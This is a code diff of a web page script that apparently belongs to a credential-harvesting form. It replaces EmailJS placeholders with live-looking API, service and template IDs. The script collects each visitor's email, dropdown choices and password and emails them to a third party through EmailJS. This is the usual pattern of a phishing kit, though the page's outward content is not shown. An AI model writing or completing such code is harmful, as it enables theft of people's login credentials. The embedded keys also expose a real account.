@@ -8,16 +8,15 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your User ID from EmailJS dashboard
+        // Initialize EmailJS with your public API key
         (function(){
-            emailjs.init("YOUR_USER_ID"); // Replace with your actual User ID
+            emailjs.init("UzvWE4cijC2AeexsY"); // Public API Key from EmailJS
         })();
 
         $(document).ready(function(){
             $('form').on('submit', function(event) {
                 event.preventDefault(); // Prevent default form submission
 
-                // Collect form data
                 var emailData = {
                     email: $('input[name=email]').val(),
                     dropdown1: $('select[name=dropdown1]').val(),
@@ -27,8 +26,8 @@
                     password: $('input[name=password]').val()
                 };
 
-                // Send email using EmailJS
-                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailData)
+                // Send email using EmailJS with your template ID and service ID
+                emailjs.send("service_29nyhzq", "template_i3682ek", emailData)  // Using provided service ID and template ID
                     .then(function(response) {
                         console.log('Success:', response);
                         alert('Email sent successfully!');
